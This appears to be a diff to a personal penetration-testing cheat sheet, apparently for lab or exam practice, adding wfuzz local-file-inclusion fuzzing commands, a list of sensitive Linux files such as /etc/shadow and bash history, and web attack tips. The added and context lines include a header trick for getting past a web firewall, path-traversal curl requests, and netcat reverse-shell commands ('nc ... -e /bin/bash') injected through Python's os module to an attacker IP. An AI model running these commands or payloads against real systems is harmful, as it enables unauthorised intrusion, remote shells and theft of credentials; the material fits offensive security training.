@@ -7,10 +7,12 @@
 - [Tools](#tools)
   - [feroxbuster](#feroxbuster)
   - [gobuster](#gobuster)
+  - [wfuzz](#wfuzz)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
 - [Web Attacks](#web-attacks)
+  - [Local File Inclusion](#local-file-inclusion)
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   - [Manual Enumeration](#manual-enumeration)
   - [Service Binary Hijacking](#service-binary-hijacking)
@@ -33,9 +35,18 @@ C:/Users/Administrator/NTUser.dat
 ```
 - Linux
 ```bash
+/home/user/.bash_history
+/home/user/.bash_aliases
 /etc/passwd
 /etc/shadow
 /etc/aliases
+
+# python related
+main.py
+app.py
+settings.ini
+applicationName.config
+applicationName.cfg
 ```
 
 ## Reverse Shell
@@ -90,6 +101,16 @@ curl -v target:port
 curl --path-as-is http://192.168.x.x/../../../../../../etc/passwd
 ```
 
+### wfuzz
+```bash
+# Fuzz for any files we can find
+wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=FUZZ
+
+# Fuzz for any files in our current directory
+wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py
+
+```
+
 # SSH
 ## SSH Keygen
 - See if other users can login as root using ssh key
@@ -126,6 +147,10 @@ ssh -N -R 9998 kali@192.168.118.4
 
 
 # Web Attacks
+## General Tips!
+- WAF bypass: X-Forwarded-For:127.0.0.1
+- When we're dealing with python server, see if we can use os module and send "nc 192.168.45.175 80 -e /bin/bash" when we find data entry
+
 
 ## When it's api response
 ```bash
@@ -160,7 +185,16 @@ curl -X post --data "code=os.system('nc 192.168.45.175 80 -e /bin/sh')" http://1
 - If wget doesn't work, maybe it only requires very simple way to get through: such as pivot as other users)
 
 
+## Local File Inclusion
+- Make sure to check "important files" list
+- Make sure to see what files we can find using wfuzz on our current location
+  - Make sure to check file extension(.py, .js, .conf, .config...)
 
+```bash
+# Local File Inclusion...
+wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py
+
+```
 
 
 # Windows Privilege Escalation
